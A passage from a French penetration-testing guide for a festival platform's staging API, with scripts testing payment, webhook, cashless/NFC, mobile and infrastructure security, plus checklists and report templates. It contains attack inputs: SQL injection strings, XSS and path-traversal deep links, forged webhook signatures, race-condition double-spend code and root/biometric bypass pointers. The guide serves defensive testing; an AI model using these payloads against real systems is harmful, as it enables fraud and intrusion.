    fake_payload = json.dumps({"type": "payment_intent.succeeded"})
    fake_signature = "fake_signature_123"

    resp2 = requests.post(f"{BASE_URL}/api/webhooks/stripe",
                         headers={"Stripe-Signature": fake_signature},
                         data=fake_payload)

    if resp2.status_code == 200:
        print("[CRITIQUE] Fausse signature acceptee!")
    else:
        print(f"[OK] Fausse signature rejetee ({resp2.status_code})")

def test_payment_status_manipulation():
    """Test de manipulation du statut de paiement"""
    token = get_token()

    print("\n=== Test Manipulation Statut Paiement ===\n")

    # Creer une intention de paiement
    resp = requests.post(f"{BASE_URL}/api/payments/create-intent",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"amount": 5000, "currency": "eur"})

    if resp.status_code == 200:
        payment_id = resp.json().get("paymentId")

        # Tenter de marquer comme complete directement
        resp2 = requests.post(f"{BASE_URL}/api/payments/{payment_id}/complete",
                            headers={"Authorization": f"Bearer {token}"})

        if resp2.status_code == 200:
            print("[CRITIQUE] Statut paiement manipulable!")
        else:
            print("[OK] Statut paiement protege")

def test_currency_manipulation():
    """Test de manipulation de devise"""
    token = get_token()

    print("\n=== Test Manipulation Devise ===\n")

    # Tenter d'utiliser une devise non supportee
    resp = requests.post(f"{BASE_URL}/api/payments/create-intent",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"amount": 100, "currency": "XXX"})

    if resp.status_code in [200, 201]:
        print("[WARNING] Devise inconnue acceptee")
    else:
        print("[OK] Devise validee")

    # Tenter de payer en devise differente
    resp2 = requests.post(f"{BASE_URL}/api/tickets/buy",
                         headers={"Authorization": f"Bearer {token}"},
                         json={
                             "categoryId": "uuid-category",
                             "quantity": 1,
                             "currency": "JPY"  # Devise differente pour moins payer
                         })

if __name__ == "__main__":
    test_price_manipulation()
    test_webhook_signature()
    test_payment_status_manipulation()
    test_currency_manipulation()
```

### 6.2 Tests PCI-DSS Compliance

```bash
#!/bin/bash
# pci_test.sh - Tests PCI-DSS

BASE_URL="https://staging-api.festival.io"

echo "=== Tests PCI-DSS Compliance ==="

# Test 1: Verifier que les numeros de carte ne sont pas loggues
echo -e "\n[Test] Pas de PAN dans les logs"
# Ce test necessite un acces aux logs

# Test 2: TLS 1.2 minimum
echo -e "\n[Test] TLS Version"
openssl s_client -connect staging-api.festival.io:443 -tls1 2>/dev/null | grep "Protocol"
openssl s_client -connect staging-api.festival.io:443 -tls1_1 2>/dev/null | grep "Protocol"
openssl s_client -connect staging-api.festival.io:443 -tls1_2 2>/dev/null | grep "Protocol"
openssl s_client -connect staging-api.festival.io:443 -tls1_3 2>/dev/null | grep "Protocol"

# Test 3: Pas de donnees carte dans les responses
echo -e "\n[Test] Pas de PAN dans les responses API"
TOKEN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.festival.io","password":"TestUser123!"}' \
    | jq -r '.accessToken')

# Verifier historique paiements
curl -s -X GET "$BASE_URL/api/payments/me" \
    -H "Authorization: Bearer $TOKEN" | grep -E "[0-9]{13,16}"

if [ $? -eq 0 ]; then
    echo "[CRITIQUE] Numero de carte trouve dans la reponse!"
else
    echo "[OK] Pas de PAN dans les responses"
fi

# Test 4: Headers de securite
echo -e "\n[Test] Headers de securite"
curl -s -I "$BASE_URL/api/health" | grep -E "Strict-Transport|X-Frame|X-Content|Content-Security"
```

---

## 7. Tests Cashless/NFC

### 7.1 Tests Securite Cashless

```python
#!/usr/bin/env python3
"""
cashless_test.py - Tests securite cashless
"""
import requests
import uuid
import time
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://staging-api.festival.io"

def get_token(email="user@test.festival.io"):
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": email,
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_balance_manipulation():
    """Test de manipulation du solde"""
    token = get_token()

    print("\n=== Test Manipulation Solde ===\n")

    # Test 1: Recharge avec montant negatif
    resp = requests.post(f"{BASE_URL}/api/cashless/topup",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"amount": -100})

    if resp.status_code in [200, 201]:
        print("[CRITIQUE] Montant negatif accepte!")
    else:
        print(f"[OK] Montant negatif rejete ({resp.status_code})")

    # Test 2: Paiement superieur au solde
    balance_resp = requests.get(f"{BASE_URL}/api/cashless/balance",
                               headers={"Authorization": f"Bearer {token}"})
    current_balance = balance_resp.json().get("balance", 0)

    resp2 = requests.post(f"{BASE_URL}/api/cashless/pay",
                         headers={"Authorization": f"Bearer {token}"},
                         json={
                             "amount": current_balance + 1000,
                             "vendorId": "uuid-vendor"
                         })

    if resp2.status_code in [200, 201]:
        print("[CRITIQUE] Paiement superieur au solde accepte!")
    else:
        print("[OK] Paiement superieur au solde rejete")

def test_race_condition():
    """Test de race condition sur le solde"""
    token = get_token()

    print("\n=== Test Race Condition ===\n")

    # Obtenir le solde initial
    resp = requests.get(f"{BASE_URL}/api/cashless/balance",
                       headers={"Authorization": f"Bearer {token}"})
    initial_balance = resp.json().get("balance", 0)

    if initial_balance < 20:
        print("[SKIP] Solde insuffisant pour le test")
        return

    # Tenter plusieurs paiements simultanement
    def make_payment():
        return requests.post(f"{BASE_URL}/api/cashless/pay",
                           headers={"Authorization": f"Bearer {token}"},
                           json={
                               "amount": 10,
                               "vendorId": "uuid-vendor"
                           })

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_payment) for _ in range(10)]
        results = [f.result() for f in futures]

    # Verifier le solde final
    resp2 = requests.get(f"{BASE_URL}/api/cashless/balance",
                        headers={"Authorization": f"Bearer {token}"})
    final_balance = resp2.json().get("balance", 0)

    success_count = sum(1 for r in results if r.status_code in [200, 201])
    expected_balance = initial_balance - (success_count * 10)

    if final_balance < 0:
        print("[CRITIQUE] Solde negatif! Race condition exploitee!")
    elif final_balance != expected_balance:
        print(f"[WARNING] Balance inconsistante: attendu {expected_balance}, obtenu {final_balance}")
    else:
        print(f"[OK] Race condition geree. {success_count} paiements reussis")

def test_double_spend():
    """Test de double depense"""
    token = get_token()

    print("\n=== Test Double Depense ===\n")

    # Creer une transaction
    resp = requests.post(f"{BASE_URL}/api/cashless/pay",
                        headers={"Authorization": f"Bearer {token}"},
                        json={
                            "amount": 5,
                            "vendorId": "uuid-vendor",
                            "idempotencyKey": "test-key-123"
                        })

    if resp.status_code in [200, 201]:
        # Rejouer la meme transaction
        resp2 = requests.post(f"{BASE_URL}/api/cashless/pay",
                            headers={"Authorization": f"Bearer {token}"},
                            json={
                                "amount": 5,
                                "vendorId": "uuid-vendor",
                                "idempotencyKey": "test-key-123"
                            })

        if resp2.status_code == 200 and resp2.json().get("id") != resp.json().get("id"):
            print("[CRITIQUE] Double depense possible!")
        else:
            print("[OK] Idempotence respectee")

def test_nfc_spoofing():
    """Test de spoofing NFC"""
    token = get_token()

    print("\n=== Test NFC Spoofing ===\n")

    # Tenter d'associer un NFC tag deja utilise
    fake_nfc = "04:AA:BB:CC:DD:EE:FF"

    resp = requests.post(f"{BASE_URL}/api/cashless/link-nfc",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"nfcTag": fake_nfc})

    # Se connecter avec un autre utilisateur et tenter le meme tag
    token2 = get_token("user2@test.festival.io")

    resp2 = requests.post(f"{BASE_URL}/api/cashless/link-nfc",
                         headers={"Authorization": f"Bearer {token2}"},
                         json={"nfcTag": fake_nfc})

    if resp2.status_code in [200, 201]:
        print("[CRITIQUE] NFC tag peut etre reutilise!")
    else:
        print("[OK] NFC tag unique par compte")

if __name__ == "__main__":
    test_balance_manipulation()
    test_race_condition()
    test_double_spend()
    test_nfc_spoofing()
```

---

## 8. Tests Mobile

### 8.1 Tests Specifiques Mobile

```python
#!/usr/bin/env python3
"""
mobile_test.py - Tests securite mobile
"""
import requests
import base64
import json

BASE_URL = "https://staging-api.festival.io"

def test_certificate_pinning():
    """Test de certificate pinning"""
    print("\n=== Test Certificate Pinning ===\n")
    print("[INFO] Ce test necessite l'application mobile")
    print("       Utiliser un proxy (Burp/Charles) avec certificat custom")
    print("       Si l'app accepte le certificat, pinning non implemente")

def test_offline_token_storage():
    """Test du stockage securise des tokens"""
    print("\n=== Test Stockage Token ===\n")
    print("[INFO] Verifier sur l'appareil:")
    print("       - iOS: Keychain utilise?")
    print("       - Android: EncryptedSharedPreferences utilise?")
    print("       - Pas de stockage en clair dans AsyncStorage")

def test_api_key_exposure():
    """Test d'exposition des cles API"""
    print("\n=== Test Exposition Cles API ===\n")

    # Verifier les headers de l'app
    # L'app ne doit pas envoyer de cles API sensibles

    headers_to_check = [
        "X-API-Key",
        "Authorization",
        "X-Client-Secret",
    ]

    print("[INFO] Intercepter le trafic mobile et verifier:")
    for header in headers_to_check:
        print(f"       - {header}: valeur sensible?")

def test_deep_link_injection():
    """Test d'injection via deep links"""
    print("\n=== Test Deep Link Injection ===\n")

    malicious_links = [
        "festivalapp://login?token=malicious_token",
        "festivalapp://payment?amount=-100",
        "festivalapp://scan?data=<script>alert(1)</script>",
        "festivalapp://user?id=../../../etc/passwd",
    ]

    print("[INFO] Tester ces deep links sur l'application:")
    for link in malicious_links:
        print(f"       - {link}")

def test_biometric_bypass():
    """Test de bypass biometrique"""
    print("\n=== Test Bypass Biometrique ===\n")
    print("[INFO] Sur appareil roote/jailbreak:")
    print("       - Hooker la fonction de verification biometrique")
    print("       - Verifier si fallback vers PIN securise")
    print("       - Tester avec Frida: frida -U -f com.festival.app -l bypass.js")

def test_root_detection():
    """Test de detection root/jailbreak"""
    print("\n=== Test Detection Root ===\n")
    print("[INFO] Sur appareil roote/jailbreak:")
    print("       - L'app doit detecter et avertir")
    print("       - Fonctionnalites critiques (paiement) bloquees?")
    print("       - Utiliser Magisk Hide / Liberty Lite pour bypass")

if __name__ == "__main__":
    test_certificate_pinning()
    test_offline_token_storage()
    test_api_key_exposure()
    test_deep_link_injection()
    test_biometric_bypass()
    test_root_detection()
```

### 8.2 Checklist Securite Mobile

```markdown
## Checklist Securite Mobile

### Stockage des Donnees
- [ ] Tokens stockes dans Keychain (iOS) / EncryptedSharedPreferences (Android)
- [ ] Pas de donnees sensibles dans AsyncStorage en clair
- [ ] Pas de logs contenant des tokens/passwords
- [ ] Cache HTTP securise ou desactive pour donnees sensibles

### Communication
- [ ] Certificate Pinning implemente
- [ ] TLS 1.2 minimum
- [ ] Pas de donnees sensibles dans les URLs
- [ ] Timeouts configures

### Authentification
- [ ] Biometrie avec fallback securise
- [ ] Session timeout implemente
- [ ] Refresh token stocke securise
- [ ] Logout efface toutes les donnees locales

### Code
- [ ] Obfuscation activee (ProGuard/R8)
- [ ] Pas de cles API en dur
- [ ] Detection root/jailbreak
- [ ] Anti-tampering

### Offline
- [ ] Donnees offline chiffrees
- [ ] Sync securise au retour online
- [ ] Validation des donnees offline
```

---

## 9. Tests Infrastructure

### 9.1 Scan de Vulnerabilites

```bash
#!/bin/bash
# infra_scan.sh - Scan infrastructure

TARGET="staging-api.festival.io"

echo "=== Scan Infrastructure ==="

# Nmap - Ports ouverts
echo -e "\n[Nmap] Scan des ports"
nmap -sS -sV -O -p- --min-rate=1000 $TARGET

# Nikto - Vulnerabilites web
echo -e "\n[Nikto] Scan vulnerabilites web"
nikto -h https://$TARGET

# SSL/TLS - Configuration
echo -e "\n[SSLScan] Configuration TLS"
sslscan $TARGET

# Nuclei - Vulnerabilites connues
echo -e "\n[Nuclei] Scan CVE"
nuclei -u https://$TARGET -t cves/

# Headers de securite
echo -e "\n[Headers] Verification headers"
curl -sI https://$TARGET/api/health | grep -E "^(Strict|X-|Content-Security)"
```

### 9.2 Tests Kubernetes

```bash
#!/bin/bash
# k8s_security.sh - Tests securite Kubernetes

echo "=== Tests Securite Kubernetes ==="

# Verifier les RBAC
echo -e "\n[RBAC] Roles et bindings"
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A

# Network policies
echo -e "\n[Network] Policies"
kubectl get networkpolicies -A

# Pod Security
echo -e "\n[Pods] Security context"
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Secrets
echo -e "\n[Secrets] Liste (ne pas afficher les valeurs!)"
kubectl get secrets -A --show-labels

# Service accounts
echo -e "\n[SA] Service accounts"
kubectl get serviceaccounts -A

# Privileged containers
echo -e "\n[Privileged] Containers privilegies"
kubectl get pods -A -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.name}{"\t"}{.securityContext.privileged}{"\n"}{end}{end}'
```

### 9.3 Tests Docker

```bash
#!/bin/bash
# docker_security.sh - Tests securite Docker

echo "=== Tests Securite Docker ==="

# Images - Vulnerabilites
echo -e "\n[Trivy] Scan images"
trivy image festival/api:latest

# Configuration
echo -e "\n[Docker Bench] Audit configuration"
docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    --label docker_bench_security \
    docker/docker-bench-security

# Secrets dans les images
echo -e "\n[Secrets] Recherche secrets dans images"
docker history --no-trunc festival/api:latest | grep -iE "password|secret|key|token"
```

---

## 10. Tests OWASP Top 10

### 10.1 Checklist Complete

```markdown
## OWASP Top 10 2021 - Checklist Tests

### A01:2021 - Broken Access Control
- [ ] IDOR sur tous les endpoints avec ID
- [ ] Bypass de fonctions admin
- [ ] Manipulation de JWT (claims, signature)
- [ ] Acces aux fichiers non autorises
- [ ] CORS misconfiguration
- [ ] Force browsing

### A02:2021 - Cryptographic Failures
- [ ] TLS configuration (version, ciphers)
- [ ] Donnees sensibles en clair
- [ ] Algorithmes faibles (MD5, SHA1 pour passwords)
- [ ] Cles cryptographiques exposees
- [ ] IV/Nonce reutilises

### A03:2021 - Injection
- [ ] SQL Injection
- [ ] NoSQL Injection
- [ ] Command Injection
- [ ] LDAP Injection
- [ ] XPath Injection
- [ ] Template Injection

### A04:2021 - Insecure Design
- [ ] Logique metier defaillante
- [ ] Absence de rate limiting
- [ ] Manque de validation cote serveur
- [ ] Erreurs exposant des details

### A05:2021 - Security Misconfiguration
- [ ] Headers de securite manquants
- [ ] Services inutiles exposes
- [ ] Comptes par defaut
- [ ] Messages d'erreur verbeux
- [ ] Directory listing

### A06:2021 - Vulnerable Components
- [ ] npm audit
- [ ] Dependances obsoletes
- [ ] CVE connues

### A07:2021 - Authentication Failures
- [ ] Brute force
- [ ] Credential stuffing
- [ ] Session fixation
- [ ] Weak passwords
- [ ] MFA bypass

### A08:2021 - Software Integrity Failures
- [ ] Signature des packages
- [ ] CI/CD security
- [ ] Deserialization

### A09:2021 - Logging Failures
- [ ] Logs insuffisants
- [ ] Logs non proteges
- [ ] Pas d'alertes

### A10:2021 - SSRF
- [ ] URL user-controlled
- [ ] Webhook URLs
- [ ] File imports
```

---

## 11. Outils et Scripts

### 11.1 Script d'Automatisation

```bash
#!/bin/bash
# pentest_auto.sh - Script automatise de pentest

set -e

TARGET="https://staging-api.festival.io"
OUTPUT_DIR="./pentest_results/$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "=== Pentest Automatise Festival Platform ==="
echo "Target: $TARGET"
echo "Output: $OUTPUT_DIR"

# Phase 1: Reconnaissance
echo -e "\n[Phase 1] Reconnaissance"
nmap -sV -sC -oA "$OUTPUT_DIR/nmap" staging-api.festival.io

# Phase 2: SSL/TLS
echo -e "\n[Phase 2] SSL/TLS"
sslscan "$TARGET" > "$OUTPUT_DIR/sslscan.txt"

# Phase 3: Headers
echo -e "\n[Phase 3] Security Headers"
curl -sI "$TARGET/api/health" > "$OUTPUT_DIR/headers.txt"

# Phase 4: API Discovery
echo -e "\n[Phase 4] API Discovery"
curl -s "$TARGET/api/docs-json" > "$OUTPUT_DIR/openapi.json"

# Phase 5: Vulnerability Scan
echo -e "\n[Phase 5] Nuclei Scan"
nuclei -u "$TARGET" -o "$OUTPUT_DIR/nuclei.txt"

# Phase 6: OWASP ZAP
echo -e "\n[Phase 6] OWASP ZAP (baseline)"
docker run -v "$OUTPUT_DIR:/zap/wrk/:rw" -t owasp/zap2docker-stable zap-api-scan.py \
    -t "$TARGET/api/docs-json" -f openapi -r zap_report.html

echo -e "\n=== Scan termine ==="
echo "Resultats dans: $OUTPUT_DIR"
```

### 11.2 Collection Nuclei Custom

```yaml
# nuclei-templates/festival-api.yaml
id: festival-api-security

info:
  name: Festival API Security Checks
  author: Security Team
  severity: medium
  description: Custom security checks for Festival Platform

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/auth/login"
    body: '{"email":"admin@test.com","password":"admin"}'
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: token
        regex:
          - '"accessToken":"([^"]+)"'

  - method: GET
    path:
      - "{{BaseURL}}/api/users"
    headers:
      Authorization: "Bearer invalid_token"
    matchers:
      - type: status
        status:
          - 200
        negative: true

  - method: POST
    path:
      - "{{BaseURL}}/api/auth/login"
    body: '{"email":"{{injection}}","password":"test"}'
    payloads:
      injection:
        - "' OR '1'='1"
        - "admin'--"
    matchers:
      - type: status
        status:
          - 200
```

---

## 12. Rapport et Remediation

### 12.1 Template de Rapport

```markdown
# Rapport de Penetration Testing
## Festival Management Platform

### Resume Executif

| Metrique | Valeur |
|----------|--------|
| Date du test | YYYY-MM-DD |
| Duree | X jours |
| Scope | API, Web, Mobile |
| Critiques | X |
| Hautes | X |
| Moyennes | X |
| Basses | X |

### Vulnerabilites Critiques

#### VULN-001: [Titre]
- **Severite**: Critique (CVSS 9.8)
- **Composant**: API Auth
- **Description**: ...
- **Impact**: ...
- **Reproduction**: ...
- **Remediation**: ...
- **References**: CVE-XXXX, OWASP A01

### Recommandations Prioritaires

1. **Immediate** (24-48h)
   - ...

2. **Court terme** (7 jours)
   - ...

3. **Moyen terme** (30 jours)
   - ...

### Annexes
- Logs des tests
- Screenshots
- Preuves de concept
```

### 12.2 Suivi des Remediations

```yaml
# remediation_tracker.yaml
vulnerabilities:
  - id: VULN-001
    title: "SQL Injection in search"
    severity: critical
    status: fixed
    fixed_date: 2026-01-15
    verified: true

  - id: VULN-002
    title: "Missing rate limiting on login"
    severity: high
    status: in_progress
    assigned_to: security-team
    due_date: 2026-01-20

  - id: VULN-003
    title: "Weak password policy"
    severity: medium
    status: pending
    due_date: 2026-02-01
```

---

## Annexes

### A. Glossaire

| Terme | Definition |
|-------|------------|
| IDOR | Insecure Direct Object Reference |
| CSRF | Cross-Site Request Forgery |
| XSS | Cross-Site Scripting |
| JWT | JSON Web Token |
| RBAC | Role-Based Access Control |

### B. References

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10: https://owasp.org/Top10/
- PCI-DSS: https://www.pcisecuritystandards.org/
- NIST: https://nvd.nist.gov/

### C. Contacts

| Role | Email |
|------|-------|
| Security Team | security@festival-platform.com |
| Bug Bounty | bounty@festival-platform.com |

---

**Document Version:** 2.0
**Derniere mise a jour:** 2026-01-02
**Prochaine revision:** 2026-04-02
